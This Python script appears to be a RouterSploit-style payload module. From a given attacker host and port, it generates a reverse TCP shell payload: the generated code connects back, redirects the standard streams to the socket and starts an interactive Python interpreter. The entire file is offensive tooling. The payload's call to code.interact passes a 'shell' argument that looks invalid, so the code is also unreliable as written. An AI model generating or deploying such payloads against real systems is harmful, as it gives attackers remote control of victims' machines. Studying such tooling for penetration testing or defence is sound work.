# rsf payload module
# rsf exploit module
# description: Generates a Python reverse TCP shell payload that connects back to lhost:lport and spawns an interactive Python shell over the socket.
import sys


def generate_reverse_shell(lhost, lport):
    """
    Generates a Python reverse TCP shell payload that connects back to lhost:lport
    and spawns an interactive Python shell over the socket.
    """

    payload = (
        "import socket,os,code\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        "s.connect(('{}',{}))\n"
        "os.dup2(s.fileno(),0)\n"
        "os.dup2(s.fileno(),1)\n"
        "os.dup2(s.fileno(),2)\n"
        "code.interact(shell=None, readfunc=None)\n"
    ).format(lhost, lport)

    return payload


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
        sys.exit(1)

    lhost = sys.argv[1]
    try:
        lport = int(sys.argv[2])
    except ValueError:
        print("LPORT must be an integer")
        sys.exit(1)

    print(generate_reverse_shell(lhost, lport))

